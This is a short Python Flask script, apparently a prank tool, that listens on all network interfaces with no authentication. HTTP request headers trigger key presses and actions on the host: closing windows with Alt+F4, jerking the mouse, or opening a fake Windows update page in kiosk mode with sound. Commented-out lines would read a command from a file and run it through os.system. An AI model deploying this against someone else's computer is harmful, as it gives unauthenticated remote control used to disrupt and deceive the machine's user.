import os
import keyboard
import time
from flask import Flask, request, abort
import ait
import pygame
app = Flask(__name__)
responsegood = '<img src="https://c.tenor.com/4Mv5tE-bc-4AAAAC/parks-and-rec-parks-and-recreation.gif" alt"haha"><p>ur do the <strong>good</strong></p>', 200
@app.route('/', methods=['GET','POST'])
def webhook():
    if request.method == 'GET':
        #file = open("extracmd.txt", "r")
        #extra_command = file.readline()
        #extra_command = "cmd /c " + extra_command
        #os.system(extra_command)
        print("moving")
        if "shake" in request.headers:
            shake()
            return responsegood
        elif "altf4" in request.headers:
            altf4()
            return responsegood
        elif "update" in request.headers:
            update()
            return responsegood
        else:
            return 'done messed up boi', 400
    else:
        print('EXITING...')
        time.sleep(2)
        os._exit(0)
def altf4():
    keyboard.send("alt+F4")
def shake():
    ait.move(60j, -9j)
    time.sleep(0.1)
    ait.move(-30j, 10j)
    time.sleep(0.1)
    ait.move(10j, 50j)
    time.sleep(0.1)
    ait.move(-40j, -51j)
def update():
    time.sleep(5)
    pygame.init()
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.load("error.mp4")
    pygame.mixer.music.play(1)
    keyboard.send('Win+R')
    time.sleep(0.1)
    keyboard.write("firefox --kiosk https://fakeupdate.net/win10ue/", delay=0.000)
    keyboard.send('Enter')
if __name__ == '__main__':
    app.run(host="0.0.0.0",port=5000)